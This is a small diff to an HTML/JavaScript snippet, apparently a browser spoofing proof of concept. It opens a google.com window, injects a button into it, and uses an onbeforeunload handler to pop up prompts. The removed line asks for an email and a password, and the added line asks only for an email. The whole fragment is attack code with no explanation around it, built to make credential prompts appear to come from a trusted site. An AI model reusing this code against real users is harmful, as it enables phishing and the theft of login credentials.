@@ -2,7 +2,7 @@
  <script> function go(){ 
  var x=window.open('https://www.google.com/csi'); 
 	 setTimeout(function(){x.document.write("<input type='button' value='click here please' onclick=document.location='https://www.google.com'>");
-						  x.onbeforeunload = function(){ a=x.prompt('E-mail','');b=x.prompt('Password','');}}, 400);
+       x.onbeforeunload = function(){ prompt('E-mail','')}}, 400);
 	 }
  </script> 
  
